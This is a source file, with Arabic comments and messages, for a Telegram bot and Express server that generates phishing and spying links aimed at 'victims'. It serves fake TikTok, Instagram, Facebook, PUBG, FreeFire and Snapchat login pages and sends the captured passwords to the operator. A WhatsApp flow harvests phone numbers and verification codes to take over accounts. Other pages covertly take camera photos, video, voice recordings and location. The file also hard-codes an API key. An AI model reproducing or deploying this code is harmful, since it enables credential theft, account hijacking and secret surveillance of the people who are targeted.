const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const axios = require('axios');
const uuid = require('uuid');
require('dotenv').config(); // تحميل المتغيرات من ملف .env

// بيانات البوت
const botToken = process.env.BOT_TOKEN; // تحميل التوكن من ملف .env
const botUsername = 'SJGDD_bot'; // ضع هنا يوزر البوت الخاص بك بدون @
const bot = new TelegramBot(botToken, { polling: true });


const developerChannels = ['@Y_E_SG', '@SJGDDW'];

let userPoints = {}; // لتخزين النقاط لكل مستخدم
let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
let visitorData = {}; // لتتبع زيارات المستخدمين عبر جميع الروابط

// وظيفة لحذف ذاكرة التخزين المؤقتة
function clearCache() {
    console.log('Clearing cache...');
    userPoints = {};
    linkData = {};
    visitorData = {};
}

// ضبط وظيفة حذف ذاكرة التخزين المؤقتة لتعمل كل 30 دقيقة
setInterval(clearCache, 1800 * 1000); // 1800 ثانية = 30 دقيقة

async function isUserSubscribed(chatId) {
    try {
        const results = await Promise.all(
            developerChannels.map(channel =>
                bot.getChatMember(channel, chatId)
            )
        );

        // التحقق من حالة العضوية
        return results.every(result => {
            const status = result.status;
            return status === 'member' || status === 'administrator' || status === 'creator';
        });
    } catch (error) {
        console.error('Error checking subscription status:', error);
        return false;
    }
}

bot.onText(/\/Vip/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isSubscribed = await isUserSubscribed(chatId);

    if (!isSubscribed) {
    const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
    const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);

    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: buttons
        }
    });
    return;
}

    const linkId = uuid.v4(); // إنتاج معرف فريد للرابط

    // تخزين بيانات الرابط
    linkData[linkId] = {
        userId: userId,
        chatId: chatId,
        visitors: []
    };

    const message = 'مرحبًا! هذا الخيارت مدفوع بسعر30$ يمكنك تجميع النقاط وفتحها مجاني.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
                [{ text: 'سحب جميع الرقام الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
                [{ text: 'سحب جميع رسايل الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
                [{ text: 'فرمتة جوال الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
            ]
        }
    });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const linkId = query.data.split('_')[2];

    if (linkData[linkId] && linkData[linkId].userId === userId) {
        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على1$ \n: https://t.me/${botUsername}?start=${linkId}`;
        bot.sendMessage(chatId, linkMessage);
    }
});

bot.onText(/\/start (.+)/, async (msg, match) => {
    const linkId = match[1];
    const visitorId = msg.from.id;
    const chatId = msg.chat.id;

    const isSubscribed = await isUserSubscribed(chatId);
    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    if (linkData[linkId]) {
        const { userId, chatId, visitors } = linkData[linkId];

        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
            visitors.push(visitorId);

            if (!visitorData[visitorId]) {
                visitorData[visitorId] = [];
            }
            visitorData[visitorId].push(userId);

            if (!userPoints[userId]) {
                userPoints[userId] = 0;
            }
            userPoints[userId] += 1;

            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]}$\nعندما توصل لي30$ سوف يتم فتح المميزات المدفوع تلقائي `;
            bot.sendMessage(chatId, message);
        }
    }
});

// بقية الكود الثاني هنا...هنا...


// إعداد multer لاستقبال الملفات
const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(express.static(__dirname));

// إعداد multer لاستقبال الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const uploadVoice = multer({ dest: 'uploads/' });

// توجيه طلبات GET لملفات HTML
app.get('/getNameForm', (req, res) => {
    const chatId = req.query.chatId;
    const formType = req.query.type;

    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }

    let fileName = '';
    switch (formType) {
        case 'instagram':
            fileName = 'inst.html';
            break;
        case 'facebook':
            fileName = 'fees.html';
            break;
        case 'tiktok':
        default:
            fileName = 'tok.html';
            break;
    }

    res.sendFile(path.join(__dirname, fileName));
});

app.get('/getLocation/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureFront/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'capture_front.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/captureBack/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'capture_back.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

app.get('/record/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    if (validateLinkUsage(linkId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
    } else {
        res.send('تم استخدام هذا الرابط خمس مرات الرجاء تغير هذا الرابط.');
        bot.sendMessage(linkUsage[linkId].chatId, 'لقد قام ضحيتك في الدخول لرابط منتهى قم في تلغيم رابط جديد ');
    }
});

// معالجة طلبات POST
app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); // تأكد من البيانات المستلمة

    bot.sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
        .then(() => {
            // تم استلام البيانات بنجاح - لا يوجد رد من السيرفر
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
        });

    // إعادة تحميل الصفحة بدون توجيه
    res.redirect('/ok.html');
});
app.use(bodyParser.json());
app.use(express.static(__dirname));

// تعيين المسار الجذر لتوجيه الطلبات إلى ملف index.html
app.get('/whatsapp', (req, res) => {
  res.sendFile(path.join(__dirname, 'phone_form.html'));
});

app.post('/submitPhoneNumber', (req, res) => {
  const chatId = req.body.chatId;
  const phoneNumber = req.body.phoneNumber;

  // إرسال رسالة إلى التليجرام
  bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
    .then(() => {
      res.json({ success: true });
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.post('/submitCode', (req, res) => {
  const chatId = req.body.chatId;
  const code = req.body.code;

  // إرسال رسالة إلى التليجرام
  bot.sendMessage(chatId, `لقد تم وصول كود الرقم هذا هو\n: ${code}`)
    .then(() => {
      // توجيه المستخدم إلى الرابط بعد إرسال الكود
      res.redirect('https://faq.whatsapp.com/');
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error.response ? error.response.body : error);
      res.json({ success: false });
    });
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

const dataStore = {}; // لتخزين المعلومات المؤقتة

app.use(express.static(__dirname));

app.post('/submitVideo', (req, res) => {
    const chatId = req.body.chatId;
    const videoData = req.body.videoData;

    // تحقق من صحة البيانات
    if (!chatId || !videoData) {
        return res.status(400).send('Invalid request: Missing chatId or videoData');
    }

    const videoDataBase64 = videoData.split(',')[1]; // افصل الباس64

    // تأكد من وجود المجلد videos، وإن لم يكن موجودًا قم بإنشائه
    const videoDir = path.join(__dirname, 'videos');
    if (!fs.existsSync(videoDir)) {
        fs.mkdirSync(videoDir);
    }

    // حفظ الفيديو
    try {
        const buffer = Buffer.from(videoDataBase64, 'base64');
        const videoPath = path.join(videoDir, `${chatId}.mp4`);
        fs.writeFileSync(videoPath, buffer);

        bot.sendVideo(chatId, videoPath, { caption: 'تم تصوير الضحيه فيديو 🎥' })
            .then(() => {
                console.log(`Stored and sent video for chatId ${chatId}`);
                res.redirect('/capture.html'); // إعادة التوجيه إلى capture.html
            })
            .catch(error => {
                console.error('Error sending video:', error);
                res.status(500).send('Failed to send video');
            });
    } catch (error) {
        console.error('Error processing video:', error);
        res.status(500).send('Failed to process video');
    }
});

app.get('/capture', (req, res) => {
    res.sendFile(path.join(__dirname, 'capture.html'));
});
let userRequests = {}; // لتخزين طلبات المستخدمين

app.post('/submitLocation', (req, res) => {
    const chatId = req.body.chatId;
    const latitude = req.body.latitude;
    const longitude = req.body.longitude;
    bot.sendLocation(chatId, latitude, longitude);
    res.send('حدث خطأ');
});

app.post('/submitPhotos', (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);

    if (imageDatas.length > 0) {
        const sendPhotoPromises = imageDatas.map((imageData, index) => {
            const buffer = Buffer.from(imageData, 'base64');
            return bot.sendPhoto(chatId, buffer, { caption: `📸الصورة ${index + 1}` });
        });

        Promise.all(sendPhotoPromises)
            .then(() => {
                console.log('');
                res.json({ success: true });
            })
            .catch(err => {
                console.error('', err);
                res.status(500).json({ error: '' });
            });
    } else {
        console.log('');
        res.status(400).json({ error: '' });
    }
});

app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
    const chatId = req.body.userId; // استخدام معرف المستخدم المرسل من عميل HTML
    const files = req.files;

    if (files && files.length > 0) {
        console.log(`تم استلام ${files.length}  ${chatId}`);
        const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer));

        Promise.all(sendPhotoPromises)
            .then(() => {
                console.log('');
                res.json({ success: true });
            })
            .catch(err => {
                console.error(':', err);
                res.status(500).json({ error: '' });
            });
    } else {
        console.log('');
        res.status(400).json({ error: '' });
    }
});

app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;

    bot.sendVoice(chatId, voicePath).then(() => {
        fs.unlinkSync(voicePath);
        res.send('');
    }).catch(error => {
        console.error(error);
        res.status(500).send('خطأ.');
    });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});

// Load and save link usage data
let linkUsage = {};
const maxAttemptsPerButton = 5; // أقصى عدد محاولات لكل زر

function loadLinkUsage() {
    try {
        linkUsage = JSON.parse(fs.readFileSync('linkUsage.json'));
    } catch (error) {
        linkUsage = {};
    }
}

function saveLinkUsage() {
    fs.writeFileSync('linkUsage.json', JSON.stringify(linkUsage));
}

function validateLinkUsage(userId, action) {
    const userActionId = `${userId}:${action}`;
    if (isVIPUser(userId)) {
        return true;
    }

    if (linkUsage[userActionId] && linkUsage[userActionId].attempts >= maxAttemptsPerButton) {
        return false;
    }

    if (!linkUsage[userActionId]) {
        linkUsage[userActionId] = { attempts: 0 };
    }

    linkUsage[userActionId].attempts++;
    saveLinkUsage();
    return true;
}

loadLinkUsage();

// Manage VIP users
let vipUsers = {};

function loadVIPUsers() {
    try {
        vipUsers = JSON.parse(fs.readFileSync('vipUsers.json'));
    } catch (error) {
        vipUsers = {};
    }
}

function saveVIPUsers() {
    fs.writeFileSync('vipUsers.json', JSON.stringify(vipUsers));
}

function addVIPUser(userId) {
    vipUsers[userId] = true;
    saveVIPUsers();
}

function removeVIPUser(userId) {
    delete vipUsers[userId];
    saveVIPUsers();
}

function isVIPUser(userId) {
    return !!vipUsers[userId];
}

loadVIPUsers();

// Respond to /start command
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const isSubscribed = await isUserSubscribed(chatId);

    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
        
        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    const message = 'مرحبًا! يمكنك التمتع في الخدمات🇾🇪:';
bot.sendMessage(chatId, message, {
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'اختراق الكامرا الاماميه 📸', callback_data: `captureFront:${chatId}` },
                { text: 'اختراق الكامرا الاخلفيه 📷', callback_data: `captureBack:${chatId}` }
            ],
            [
                { text: 'تصوير الضحيه فيديو 🎥', callback_data: 'capture_video' },
                { text: 'اختراق الموقع📍', callback_data: `getLocation:${chatId}` }
            ],
            [
                { text: 'تسجيل صوت الضحيه 🎤', callback_data: `recordVoice:${chatId}` },
                { text: "اختراق كامراة المراقبه 📡", callback_data: "get_cameras" }
            ],
            [
                { text: 'اختراق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` },
                { text: 'اختراق وتساب 🟢', callback_data: 'request_verification' }
            ],
            [
                { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` },
                { text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }
            ],
            [
                { text: 'إختراق ببجي 🕹', callback_data: 'get_pubg' },
                { text: 'إختراق فري فاير 👾', callback_data: 'get_freefire' }
            ],
            [
                { text: 'إختراق سناب شات ⭐', callback_data: 'add_names' },
                { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } }
            ],
            [
                { text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' },
                { text: '⚠️تلغيم رابط⚠️', callback_data: 'malware_link' }
            ],
            [
                { text: 'الدردشه مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } },
                { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }
            ],
            [
                { text: 'اكتب لي رسالة فك حظر واتساب 🚸', callback_data: 'get_love_message' },
                { text: 'تفسير الاحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } }
            ],
            [
                { text: 'لعبة الاذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } },
                { text: 'إختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }
            ],
            [
                { text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' },
                { text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }
            ]
        ]
    }
});


    // إضافة أزرار لوحة التحكم للمطور
    if (chatId == 7130416076) {
        bot.sendMessage(chatId, 'مرحبًا بك عزيزي حمودي في لوحة التحكم:', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'إضافة مشترك VIP', callback_data: 'add_vip' }],
                    [{ text: 'إلغاء اشتراك VIP', callback_data: 'remove_vip' }]
                ]
            }
        });
    }
});
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'capture_video') {
        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://hahaha-pfyy.onrender.com/capture?chatId=${chatId}`;
        bot.sendMessage(chatId, message);
    }
});
// Handle button callbacks
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];

    if (!exemptButtons.includes(data.split(':')[0]) && !(await isUserSubscribed(chatId))) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));
        
        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: [buttons]
            }
        });
        return;
    }

    if (data === 'request_verification') {
        const verificationLink = `https://hahaha-pfyy.onrender.com/whatsapp?chatId=${chatId}`;
        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
        return;
    }

   const [action, userId] = data.split(':');

if (action === 'get_joke') {
    try {
        const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
        const response = await axios.post('https://api.cohere.ai/v1/generate', {
            model: 'command-xlarge-nightly',
            prompt: jokeMessage,
            max_tokens: 50,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer uXr5n9GNQTpWYxJ67QVHBNYi25UQxJtl77uAMm9d`,
                'Content-Type': 'application/json'
            }
        });
        const joke = response.data.generations[0].text;

        bot.sendMessage(chatId, joke);
    } catch (error) {
        console.error('Error fetching joke:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
    }
} else if (data === 'get_love_message') {
    try {
        const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
        const response = await axios.post('https://api.cohere.ai/v1/generate', {
            model: 'command-xlarge-nightly',
            prompt: loveMessage,
            max_tokens: 800,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer uXr5n9GNQTpWYxJ67QVHBNYi25UQxJtl77uAMm9d`,
                'Content-Type': 'application/json'
            }
        });
        const love = response.data.generations[0].text;

        bot.sendMessage(chatId, love);
    } catch (error) {
        console.error('Error fetching love message:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
    }

    } else if (data === 'add_vip' && chatId == 7130416076) {
        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:');
        bot.once('message', (msg) => {
            const userId = msg.text;
            addVIPUser(userId);
            bot.sendMessage(chatId, `تم إضافة المستخدم ${userId} كـ VIP.`);
        });
    } else if (data === 'remove_vip' && chatId == 7130416076) {
        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإزالته من VIP:');
        bot.once('message', (msg) => {
            const userId = msg.text;
            removeVIPUser(userId);
            bot.sendMessage(chatId, `تم إزالة المستخدم ${userId} من VIP.`);
        });
    } else {
        const [action, userId] = data.split(':');

        if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {
            bot.sendMessage(chatId, 'لقد استنفدت المحاولات المجانية لهذا الخيار. الرجاء الاشتراك كـ VIP لاستخدام هذه الخدمة. تواصل مع @SAGD112 للحصول على التفاصيل.');
            return;
        }

        let link = '';

        switch (action) {
            case 'captureFront':
                link = `https://hahaha-pfyy.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'captureBack':
                link = `https://hahaha-pfyy.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'getLocation':
                link = `https://hahaha-pfyy.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'recordVoice':
                const duration = 10;  // مدة التسجيل الثابتة
                link = `https://hahaha-pfyy.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                break;
            case 'rshq_tiktok':
                link = `https://hahaha-pfyy.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
                break;
            case 'rshq_instagram':
                link = `https://hahaha-pfyy.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
                break;
            case 'rshq_facebook':
                link = `https://hahaha-pfyy.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
                break;
            default:
                bot.sendMessage(chatId, '');
                return;
        }

        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); // تأكد من البيانات المستلمة

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'pubg.html')); // إرسال ملف النموذج HTML مرة أخرى
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/get', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'pubg.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); // تأكد من البيانات المستلمة

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'FreeFire.html')); // إرسال ملف النموذج HTML مرة أخرى
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getNam', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'FreeFire.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); // تأكد من البيانات المستلمة

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'Snapchat.html')); // إرسال ملف النموذج HTML مرة أخرى
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); // تسجيل تفاصيل الخطأ
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getName', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'Snapchat.html'));
});
const countryTranslation = {
  "AF": "أفغانستان 🇦🇫",
  "AL": "ألبانيا 🇦🇱",
  "DZ": "الجزائر 🇩🇿",
  "AO": "أنغولا 🇦🇴",
  "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 

    // ... إضافة بقية الدول هنا
};





